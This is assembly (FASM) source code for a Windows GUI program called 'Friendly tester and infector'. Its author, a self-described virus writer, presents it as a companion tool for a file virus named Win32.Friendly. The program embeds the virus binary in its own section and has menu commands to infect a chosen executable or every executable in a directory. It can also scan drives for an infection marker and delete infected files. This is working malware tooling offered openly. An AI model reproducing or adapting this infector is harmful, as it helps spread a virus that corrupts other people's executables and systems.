;(c) iron[TPOC] 2005
;http://thepoc.exploiterz.org
;
;This is useful program for testing my virus Win32.Friendly.
; 
;GUARANTEE:
;This software is provided "as is", without any guarantee made
;as to its suitability or fitness for any particular use. It may
;contain bugs, so use of this software is at your own risk. Author take
;no responsibility for any damage that may unintentionally be caused
;through its use.
;
;WARNING! The executable file "Infector.exe" has infection label,
;so it can't be infected by virus.
;
;Compile with FASM.
;You need file "Win32.Friendly.exe" to be in the project folder to compile this shit.
;Infector will not work without find.dll, so you need it too.
;
;Greets: Bill, Ct757, Freeman, _follower, Alex_RSD and all VX'ers.

format PE GUI 4.0 on 'stub.bin'
entry start

include '%fasminc%\win32a.inc'

MAX_PATH             = 260

CHAR_WIDTH           = 8
STATUS_HEIGHT        = 16

IDM_FILE             = 100
IDM_FILE_SAVE        = 101
IDM_EXIT             = 110
IDM_TEST             = 200
IDM_TEST_FILE        = 201
IDM_TEST_DIRECTORY   = 202
IDM_TEST_FLOPPY      = 203
IDM_TEST_HDS         = 204
IDM_INFECT           = 300
IDM_INFECT_FILE      = 301
IDM_INFECT_DIRECTORY = 302
IDM_HELP             = 400
IDM_ABOUT            = 401
IDM_STOP             = 500
IDM_DS               = 601
IDM_DA               = 602

struct BROWSEINFO
    hwndOwner       dd ?
    pidlRoot        dd ?
    pszDisplayName  dd ?
    lpszTitle       dd ?
    ulFlags         dd ?
    lpfn            dd ?
    lParam          dd ?
    iImage          dd ?
ends

struct WIN32_FILE_ATTRIBUTE_DATA
    dwFileAttributes    dd ?
    ftCreationTime      FILETIME
    ftLastAccessTime    FILETIME
    ftLastWriteTime     FILETIME
    nFileSizeHigh       dd ?
    nFileSizeLow        dd ?
ends

include 'offsets.1.inc'

section '.data' data readable writeable

_title	    db 'Friendly tester and infector',0
_class	    db 'InfectorWindow',0
_listbox    db 'LISTBOX',0
_static     db 'STATIC',0
_confirm    db 'Are you sure want to do this?',0
_err_del    db "Can't delete this file.",0
_n_r	    db 13,10
_about_text db '(c) iron[TPOC] 2005',13
            db 'http://thepoc.exploiterz.org',13,13
            db 'This is useful program for testing my virus Win32.Friendly.',13,13
            db 'GUARANTEE:',13
            db 'This software is provided "as is", without any guarantee made',13
            db 'as to its suitability or fitness for any particular use. It may',13
            db 'contain bugs, so use of this software is at your own risk. Author take',13
            db 'no responsibility for any damage that may unintentionally be caused',13
            db 'through its use.',13,13
            db "Greets: Bill, Ct757, Freeman, _follower, Alex_RSD and all VX'ers.",0
_list_font  db 'Courier',0
strFilter   db 'Executable files (*.exe)',0
Pattern     db '*.exe',0,'All Files',0,'*',0,0
strFilterSv db 'Log files (*.log)',0,'*.log',0,0
shell	    db 'SHELL32.DLL',0
template    db 'Total:      |Infected:      | ',0
	        rb MAX_PATH

nTotal	    dd ?
nInfected   dd ?
mainhwnd    dd ?
hlist	    dd ?
hstatus     dd ?
hinstance   dd ?
hfont	    dd ?
hmenu	    dd ?
hcmenu	    dd ?
hThread     dd ?
max_len     dd ?
hSaveFile   dd ?
nBytes	    dd ?

msg	        MSG
wc	        WNDCLASS
clRect	    RECT
ofn	        OPENFILENAME
bi	        BROWSEINFO
;bi_size     = $-bi
fa	        WIN32_FILE_ATTRIBUTE_DATA
FileName    rb MAX_PATH
Drives	    rb 26*4+1
Buffer	    rb 10
ModuleName  rb MAX_PATH


section '.code' code readable executable

  start:

	invoke	GetModuleHandle,0
	mov	[hinstance],eax
	invoke	GetModuleHandle,shell
	invoke	LoadIcon,eax,274;240
	mov	[wc.hIcon],eax
	invoke	LoadCursor,0,IDC_ARROW
	mov	[wc.hCursor],eax
	mov	[wc.style],0
	mov	[wc.lpfnWndProc],WindowProc
	mov	[wc.cbClsExtra],0
	mov	[wc.cbWndExtra],0
	mov	eax,[hinstance]
	mov	[wc.hInstance],eax
	mov	[wc.hbrBackground],COLOR_BTNFACE+1
	mov	[wc.lpszMenuName],37
	mov	[wc.lpszClassName],_class
	invoke	RegisterClass,wc

	invoke	CreateWindowEx,0,_class,_title,WS_VISIBLE+WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,[hinstance],NULL
	mov	[mainhwnd],eax

	invoke	ShowWindow,eax,SW_SHOW
	invoke	UpdateWindow,[mainhwnd]
  msg_loop:
	invoke	GetMessage,msg,NULL,0,0
	or	eax,eax
	jz	end_loop
	invoke	TranslateMessage,msg
	invoke	DispatchMessage,msg
	jmp	msg_loop

  end_loop:
	invoke	ExitProcess,[msg.wParam]

;Процедура окна
proc WindowProc, hwnd,wmsg,wparam,lparam
	push	ebx esi edi
	mov	eax,[wmsg]
	cmp	eax,WM_COMMAND
	je	wmcommand
	cmp	eax,WM_DESTROY
	je	wmdestroy
	cmp	eax,WM_CREATE
	je	wmcreate
	cmp	eax,WM_SIZE
	je	wmsize
	cmp	eax,WM_CONTEXTMENU
	je	wmcontextmenu

  defwndproc:
    invoke	DefWindowProc,[hwnd],[wmsg],[wparam],[lparam]
    jmp	finish
  wmcreate:
	invoke GetModuleFileName,0,ModuleName,MAX_PATH
	invoke GetClientRect,[hwnd],clRect
    invoke GetMenu,[hwnd]
        mov [hmenu],eax
        sub [clRect.bottom],STATUS_HEIGHT
        invoke	CreateWindowEx,WS_EX_CLIENTEDGE,_listbox,0,\
                    WS_CHILD+WS_VISIBLE+WS_VSCROLL+WS_HSCROLL+LBS_NOINTEGRALHEIGHT+LBS_HASSTRINGS+LBS_SORT,\
                    [clRect.left],[clRect.top],[clRect.right],[clRect.bottom],[hwnd],0,[hinstance],NULL
        mov	[hlist],eax
        invoke CreateWindowEx,WS_EX_STATICEDGE,_static,0,WS_CHILD+WS_VISIBLE,\
        [clRect.left],[clRect.bottom],[clRect.right],STATUS_HEIGHT,[hwnd],0,[hinstance],NULL
        mov [hstatus],eax
        xor eax,eax
        invoke	CreateFont,15,eax,eax,eax,FW_NORMAL,eax,eax,eax,DEFAULT_CHARSET,OUT_RASTER_PRECIS,CLIP_CHARACTER_PRECIS,\
                DEFAULT_QUALITY,FIXED_PITCH+FF_DONTCARE,_list_font
        mov [hfont],eax
        invoke SendMessage,[hlist],WM_SETFONT,eax,TRUE
        invoke SendMessage,[hstatus],WM_SETFONT,[hfont],TRUE
        call UpdateStatus
        invoke LoadMenu,[hinstance],38
        invoke GetSubMenu,eax,0
        mov [hcmenu],eax
        mov esi,API_namez
        mov edi,API_ptrz
        call GetApiZ
        xor eax,eax
        jmp finish
  wmsize:
	invoke GetClientRect,[hwnd],clRect
	mov eax,[clRect.bottom]
	sub eax,STATUS_HEIGHT
	push eax
	invoke MoveWindow,[hlist],[clRect.left],[clRect.top],[clRect.right],eax,TRUE
	pop eax
	invoke MoveWindow,[hstatus],[clRect.left],eax,[clRect.right],STATUS_HEIGHT,TRUE
	xor eax,eax
	jmp finish
  wmcontextmenu:
	mov eax,[lparam]
	mov ecx,eax
	and eax,0xFFFF
	shr ecx,16
	invoke TrackPopupMenu,[hcmenu],TPM_LEFTALIGN+TPM_TOPALIGN,eax,ecx,0,[hwnd],0
	xor eax,eax
	jmp finish
  wmcommand:
	mov eax,[wparam]
	and eax,0xFFFF
	cmp eax,IDM_FILE_SAVE
	je  file_save
	cmp eax,IDM_EXIT
	je  wmdestroy
	cmp eax,IDM_TEST_FILE
	je test_file
	cmp eax,IDM_TEST_DIRECTORY
	je test_directory
	cmp eax,IDM_TEST_FLOPPY
	je test_floppy
	cmp eax,IDM_TEST_HDS
	je test_hds
	cmp eax,IDM_INFECT_FILE
	je infect_file
	cmp eax,IDM_INFECT_DIRECTORY
	je infect_directory
	cmp eax,IDM_STOP
	je stop
	cmp eax,IDM_ABOUT
	je about
	cmp eax,IDM_DA
	je delete_all
	cmp eax,IDM_DS
	je delete_sel
	jmp defwndproc
  file_save:
	call SaveLogToFile
	xor eax,eax
	jmp finish
  test_file:
	call OpenFileDlg
	test eax,eax
	jz finish
	call ClearList
	push FileName
	call TestFile
	xor eax,eax
	jmp finish
  test_directory:
	call BrowseForFolderDlg
	test eax,eax
	jz finish
  create_dir_thread:
	xor eax,eax
	push eax
	invoke CreateThread,eax,eax,ProcessDir,TestFile,eax,esp
	mov [hThread],eax
	pop eax
	xor eax,eax
	jmp finish
  test_floppy:
	mov dword[FileName],3A41H
	jmp create_dir_thread
  test_hds:
	xor eax,eax
	push eax
	invoke CreateThread,eax,eax,TestHDs,eax,eax,esp
	mov [hThread],eax
	pop eax
	xor eax,eax
	jmp finish
  infect_file:
	call OpenFileDlg
	test eax,eax
	jz finish
	invoke MessageBox,[hwnd],_confirm,_title,MB_ICONWARNING+MB_YESNO
	cmp eax,IDYES
	jz @F
	xor eax,eax
	jmp finish
  @@:
	invoke GetFileAttributesEx,FileName,0,fa
	call ClearList
	push fa
	push FileName
	call InfectFile
	xor eax,eax
	jmp finish
  infect_directory:
	call BrowseForFolderDlg
	test eax,eax
	jz finish
	invoke MessageBox,[hwnd],_confirm,_title,MB_ICONWARNING+MB_YESNO
	cmp eax,IDYES
	jz @F
	xor eax,eax
	jmp finish
  @@:
	xor eax,eax
	push eax
	invoke CreateThread,eax,eax,ProcessDir,InfectFile,eax,esp
	mov [hThread],eax
	pop eax
	xor eax,eax
	jmp finish
  stop:
	invoke TerminateThread,[hThread],0
	call DisableStop
	xor	eax,eax
	jmp finish
  about:
	invoke MessageBox,[hwnd],_about_text,_title,MB_OK+MB_ICONWARNING
	xor	eax,eax
	jmp finish
  delete_all:
	xor eax,eax
	push eax
	invoke CreateThread,eax,eax,DeleteAll,eax,eax,esp
	mov [hThread],eax
	pop eax
	xor eax,eax
	jmp finish
  delete_sel:
	call DeleteSelected
	xor eax,eax
	jmp finish
  wmdestroy:
	invoke	PostQuitMessage,0
	xor	eax,eax
  finish:
	pop	edi esi ebx
	ret
endp

proc TestHDs,lpParameter
     push ebx esi edi
     call EnableStop
     call ClearList
     invoke GetLogicalDriveStrings,26*4+1,Drives
     push Drives
drives_loop:
     pop esi
     lodsd
     test al,al
     jz exit_test_all
     push esi
     push eax
     invoke GetDriveType,esp
     pop ecx
     cmp eax,DRIVE_CDROM
     je drives_loop
     and cl,0DFh
     cmp cl,'A'
     jz drives_loop
     mov dword[FileName],ecx
     invoke FindFiles,FileName,Pattern,TestFile
     jmp drives_loop

exit_test_all:
     call DisableStop
     mov byte[FileName],0
     call UpdateStatus
     xor eax,eax
     pop edi esi ebx
     ret
endp

proc ProcessDir,ProcAddr
    push ebx esi edi
    call EnableStop
    call ClearList
    invoke FindFiles,FileName,Pattern,[ProcAddr]
    call DisableStop
    mov byte[FileName],0
    call UpdateStatus
    xor eax,eax
    pop edi esi ebx
    ret
endp

proc DisableStop
    invoke EnableMenuItem,[hmenu],IDM_FILE,MF_ENABLED
    invoke EnableMenuItem,[hmenu],IDM_TEST,MF_ENABLED
    invoke EnableMenuItem,[hmenu],IDM_INFECT,MF_ENABLED
    invoke EnableMenuItem,[hmenu],IDM_STOP,MF_GRAYED
    invoke EnableMenuItem,[hmenu],IDM_HELP,MF_ENABLED
    invoke DrawMenuBar,[mainhwnd]
    ret
endp

proc EnableStop
    invoke EnableMenuItem,[hmenu],IDM_FILE,MF_GRAYED
    invoke EnableMenuItem,[hmenu],IDM_TEST,MF_GRAYED
    invoke EnableMenuItem,[hmenu],IDM_INFECT,MF_GRAYED
    invoke EnableMenuItem,[hmenu],IDM_STOP,MF_ENABLED
    invoke EnableMenuItem,[hmenu],IDM_HELP,MF_GRAYED
    invoke DrawMenuBar,[mainhwnd]
    ret
endp

proc UpdateStatus
    push 10
    push Buffer
    push [nTotal]
    call itoa
    invoke lstrlenA,eax
    push eax
    push 5
    pop ecx
    sub ecx,eax
    mov edi,template+7
    mov al,' '
    rep stosb
    pop ecx
    mov esi,Buffer
    rep movsb
    add edi,11
    push edi
    push esi
    push 10
    push esi
    push [nInfected]
    call itoa
    invoke lstrlenA,eax
    pop esi
    pop edi
    push eax
    push 5
    pop ecx
    sub ecx,eax
    mov al,' '
    rep stosb
    pop ecx
    rep movsb
    add edi,2
    xor eax,eax
    stosb
    invoke lstrcatA,template,FileName
    invoke SetWindowText,[hstatus],template
    ret
endp

proc ClearList
    xor eax,eax
    mov [max_len],eax
    mov [nTotal],eax
    mov [nInfected],eax
    invoke SendMessage,[hlist],LB_SETHORIZONTALEXTENT,eax,0
    invoke SendMessage,[hlist],LB_RESETCONTENT,0,0
    ret
endp

proc TestFile,pFileName,pFData
    inc [nTotal]
    cmp [pFileName],FileName
    jz	@F
    invoke lstrcpyA,FileName,[pFileName]
@@:
    invoke lstrcmpA,FileName,ModuleName
    test eax,eax
    jz not_inf
    call IsInfected
    test eax,eax
    jz not_inf
    inc [nInfected]
    ;invoke MessageBeep,-1;MB_ICONEXCLAMATION
    ;push strInf
    ;push FileName
    ;call [lstrcatA]
    invoke lstrlenA,FileName
    cmp eax,[max_len]
    jle @F
    mov [max_len],eax
    cdq
    inc eax
    imul eax,CHAR_WIDTH
    invoke SendMessage,[hlist],LB_SETHORIZONTALEXTENT,eax,0
@@:
    invoke SendMessage,[hlist],LB_ADDSTRING,0,FileName
not_inf:
    call UpdateStatus
    ret
endp

proc OpenFileDlg
    mov edi,ofn
    mov ecx,sizeof.OPENFILENAME
    xor eax,eax
    rep stosb
    mov [ofn.lStructSize],sizeof.OPENFILENAME
    mov eax,[mainhwnd]
    mov [ofn.hwndOwner],eax
    mov eax,[hinstance]
    mov [ofn.hInstance],eax
    mov [ofn.lpstrFilter],strFilter
    mov [ofn.nFilterIndex],1
    mov eax,FileName
    mov byte[eax],0
    mov [ofn.lpstrFile],eax
    mov [ofn.nMaxFile],MAX_PATH
    mov [ofn.Flags],OFN_FILEMUSTEXIST+OFN_HIDEREADONLY+OFN_EXPLORER
    invoke GetOpenFileName,ofn
    ret
endp

proc BrowseForFolderDlg
    xor eax,eax
    mov edi,bi
    mov ecx,sizeof.BROWSEINFO
    rep stosb
    mov eax,[mainhwnd]
    mov [bi.hwndOwner],eax
    mov [bi.pszDisplayName],FileName
    mov [bi.ulFlags],0x241
    invoke SHBrowseForFolder,bi
    test eax,eax
    jz @F
    invoke SHGetPathFromIDList,eax,FileName
    xor eax,eax
    inc eax
@@:
    ret
endp

proc SaveLogToFile
    mov edi,ofn
    mov ecx,sizeof.OPENFILENAME
    xor eax,eax
    rep stosb
    mov [ofn.lStructSize],sizeof.OPENFILENAME
    mov eax,[mainhwnd]
    mov [ofn.hwndOwner],eax
    mov eax,[hinstance]
    mov [ofn.hInstance],eax
    mov [ofn.lpstrFilter],strFilterSv
    mov [ofn.nFilterIndex],1
    mov eax,FileName
    mov byte[eax],0
    mov [ofn.lpstrFile],eax
    mov [ofn.nMaxFile],MAX_PATH
    mov [ofn.Flags],OFN_EXPLORER+OFN_HIDEREADONLY
    invoke GetSaveFileName,ofn
    test eax,eax
    jz exit_sltf
    invoke CreateFile,FileName,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
    inc eax
    jz exit_sltf
    dec eax
    mov [hSaveFile],eax
    invoke SendMessage,[hlist],LB_GETCOUNT,0,0
    mov ecx,eax
    test ecx,ecx
    jz close_sltf_file
    xor edx,edx
save_loop:
    push ecx
    push edx
    invoke SendMessage,[hlist],LB_GETTEXT,edx,FileName
    invoke lstrlenA,FileName
    invoke WriteFile,[hSaveFile],FileName,eax,nBytes,0
    invoke WriteFile,[hSaveFile],_n_r,2,nBytes,0
    pop edx
    pop ecx
    inc edx
    loop save_loop
    invoke WriteFile,[hSaveFile],_n_r,2,nBytes,0
    invoke GetWindowText,[hstatus],FileName,MAX_PATH+40
    invoke lstrlenA,FileName
    test eax,eax
    jz close_sltf_file
    invoke WriteFile,[hSaveFile],FileName,eax,nBytes,0
close_sltf_file:
	invoke CloseHandle,[hSaveFile]
exit_sltf:
    ret
endp

proc IsInfected
hFile	equ ebp-4
hMap	equ ebp-8
Base	equ ebp-12
RetCode equ ebp-16
    push ebp
    mov  ebp,esp
    add  esp,-16

    xor eax,eax
    mov [RetCode],eax
    invoke CreateFile,FileName,GENERIC_READ,eax,eax,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,eax
    inc eax
    jz exit
    dec eax
    mov [hFile],eax
    xor edx,edx
    invoke CreateFileMapping,eax,edx,PAGE_READONLY,edx,edx,edx
    test eax,eax
    jz	close_file
    mov [hMap],eax
    xor edx,edx
    invoke MapViewOfFile,eax,FILE_MAP_READ,edx,edx,edx
    test eax,eax
    jz close_map
    mov [Base],eax
    cmp word[eax],5A4DH ;'MZ'
    jne unmap
    cmp word[eax+0x18],0x40
    jne unmap
    add eax,dword[eax+0x3C]
    cmp dword[eax],4550H
    jne unmap
    cmp byte[eax-1],'*'
    jne unmap
    inc dword[RetCode]
unmap:
    invoke UnmapViewOfFile,dword[Base]
close_map:
    invoke CloseHandle,dword[hMap]
close_file:
    invoke CloseHandle,dword[hFile]
exit:
    mov eax,[RetCode]
    leave
    ret
endp

proc itoa,Num,String,r
    push ecx edx edi
	mov eax,[Num]
	mov edi,[String]
	xor ecx,ecx
	test eax,eax
	jz zero
	jg lp
	neg eax
lp:
	test eax,eax
	jz ok
	cdq
	div [r]
	add dl,30h
	cmp dl,39h
	jle digit
	add dl,7
digit:
	push edx
	inc ecx
	jmp lp
ok:
	cmp [Num],0
	jg exit_itoa
	mov al,'-'
	stosb
exit_itoa:
	jcxz ret_itoa
	pop eax
	stosb
	dec ecx
	jmp exit_itoa
zero:
	mov al,30h
	stosb
ret_itoa:
	xor al,al
	stosb
	mov eax,[String]
	pop edi edx ecx
	ret
endp

proc InfectFile,pFileName,pFData
    inc [nTotal]
    cmp [pFileName],FileName
    jz @F
    invoke lstrcpyA,FileName,[pFileName]
@@:
    mov ebx,delta
    push [pFData]
    push [pFileName]
    call InfectProc
    test eax,eax
    jg	exit_ip
    inc [nInfected]
    invoke lstrlenA,FileName
    cmp eax,[max_len]
    jle @F
    mov [max_len],eax
    cdq
    inc eax
    imul eax,CHAR_WIDTH
    invoke SendMessage,[hlist],LB_SETHORIZONTALEXTENT,eax,0
@@:
    invoke SendMessage,[hlist],LB_ADDSTRING,0,FileName
exit_ip:
    call UpdateStatus
    ret
endp

proc DeleteAll,lpParameter
    push ebx esi edi
    call EnableStop
    invoke SendMessage,[hlist],LB_GETCOUNT,0,0
    mov ecx,eax
    cdq
del_loop:
    push ecx
    push edx
    invoke SendMessage,[hlist],LB_GETTEXT,edx,FileName
    invoke SetFileAttributes,FileName,FILE_ATTRIBUTE_NORMAL
    invoke DeleteFile,FileName
    pop edx
    test eax,eax
    jz not_deleted
    push edx
    invoke SendMessage,[hlist],LB_DELETESTRING,edx,0
    pop edx
    jmp end_if
not_deleted:
    inc edx
end_if:
    pop ecx
    loop del_loop
    call DisableStop
    pop edi esi ebx
    ret
endp

proc DeleteSelected
    invoke SendMessage,[hlist],LB_GETCURSEL,0,0
    push eax
    invoke SendMessage,[hlist],LB_GETTEXT,eax,FileName
    invoke SetFileAttributes,FileName,FILE_ATTRIBUTE_NORMAL
    invoke DeleteFile,FileName
    pop edx
    test eax,eax
    jnz deleted
    invoke MessageBox,[mainhwnd],_err_del,0,MB_ICONERROR
    ret
deleted:
    invoke SendMessage,[hlist],LB_DELETESTRING,edx,0
    ret
endp

section 'virus' code data readable writeable executable
virus file 'Win32.Friendly.exe':0xA00,0x1A00

section '.idata' import data readable writeable

  library kernel,'KERNEL32.DLL',\
	  user,'USER32.DLL',\
	  gdi,'GDI32.DLL',\
	  comdlg,'COMDLG32.DLL',\
	  shell32,'SHELL32.DLL',\
	  find,'FIND.DLL'

  import kernel,\
	 GetModuleHandle,'GetModuleHandleA',\
	 CreateFile,'CreateFileA',\
	 MapViewOfFile,'MapViewOfFile',\
	 UnmapViewOfFile,'UnmapViewOfFile',\
	 CloseHandle,'CloseHandle',\
	 CreateFileMapping,'CreateFileMappingA',\
	 ExitProcess,'ExitProcess',\
	 lstrcatA,'lstrcatA',\
	 lstrcpyA,'lstrcpyA',\
	 lstrlenA,'lstrlenA',\
	 lstrcmpA,'lstrcmpA',\
	 GetLogicalDriveStrings,'GetLogicalDriveStringsA',\
	 GetDriveType,'GetDriveTypeA',\
	 CreateThread,'CreateThread',\
	 TerminateThread,'TerminateThread',\
	 WriteFile,'WriteFile',\
	 GetFileAttributesEx,'GetFileAttributesExA',\
	 DeleteFile,'DeleteFileA',\
	 SetFileAttributes,'SetFileAttributesA',\
	 GetModuleFileName,'GetModuleFileNameA'

  import user,\
	 RegisterClass,'RegisterClassA',\
	 CreateWindowEx,'CreateWindowExA',\
	 ShowWindow,'ShowWindow',\
	 UpdateWindow,'UpdateWindow',\
	 DefWindowProc,'DefWindowProcA',\
	 GetMessage,'GetMessageA',\
	 TranslateMessage,'TranslateMessage',\
	 DispatchMessage,'DispatchMessageA',\
	 LoadCursor,'LoadCursorA',\
	 LoadIcon,'LoadIconA',\
	 PostQuitMessage,'PostQuitMessage',\
	 GetClientRect,'GetClientRect',\
	 MoveWindow,'MoveWindow',\
	 MessageBox,'MessageBoxA',\
	 SendMessage,'SendMessageA',\
	 GetMenu,'GetMenu',\
	 EnableMenuItem,'EnableMenuItem',\
	 GetDC,'GetDC',\
	 ReleaseDC,'ReleaseDC',\
	 MessageBeep,'MessageBeep',\
	 DrawMenuBar,'DrawMenuBar',\
	 SetWindowText,'SetWindowTextA',\
	 GetWindowText,'GetWindowTextA',\
	 TrackPopupMenu,'TrackPopupMenu',\
	 LoadMenu,'LoadMenuA',\
	 GetSubMenu,'GetSubMenu'

  import gdi,\
	 CreateFont,'CreateFontA'

  import comdlg,\
	 GetOpenFileName,'GetOpenFileNameA',\
	 GetSaveFileName,'GetSaveFileNameA'

  import shell32,\
	 SHBrowseForFolder,'SHBrowseForFolderA',\
	 SHGetPathFromIDList,'SHGetPathFromIDListA'

  import find,\
	 FindFiles,'FindFiles'

section '.rsrc' resource data readable

  ; resource directory

  directory RT_MENU,menus

  ; resource subdirectories

  resource menus,\
	   37,LANG_ENGLISH+SUBLANG_DEFAULT,main_menu,\
	   38,LANG_ENGLISH+SUBLANG_DEFAULT,context_menu

  menu main_menu
     menuitem '&File',IDM_FILE,MFR_POPUP
	   menuitem '&Save log',IDM_FILE_SAVE,0
	   menuseparator
	   menuitem 'E&xit',IDM_EXIT,MFR_END
     menuitem '&Test',IDM_TEST,MFR_POPUP
	   menuitem '&File',IDM_TEST_FILE,0
	   menuitem '&Directory',IDM_TEST_DIRECTORY,0
	   menuitem 'Flopp&y',IDM_TEST_FLOPPY,0
	   menuseparator
	   menuitem '&Hard Drives',IDM_TEST_HDS,MFR_END  
     menuitem '&Infect',IDM_INFECT,MFR_POPUP
	   menuitem '&File',IDM_INFECT_FILE,0
	   menuitem '&Directory',IDM_INFECT_DIRECTORY,MFR_END
     menuitem 'Stop',IDM_STOP,0,MF_GRAYED
     menuitem '&Help',IDM_HELP,MFR_POPUP+MFR_END
       menuitem '&About...',IDM_ABOUT,MFR_END

  menu context_menu
       menuitem '',0,MFR_POPUP+MFR_END
	 menuitem 'Delete Selected',IDM_DS,0
	 menuitem 'Delete All',IDM_DA,0
	 menuseparator
	 menuitem 'Save log to file',IDM_FILE_SAVE,MFR_END

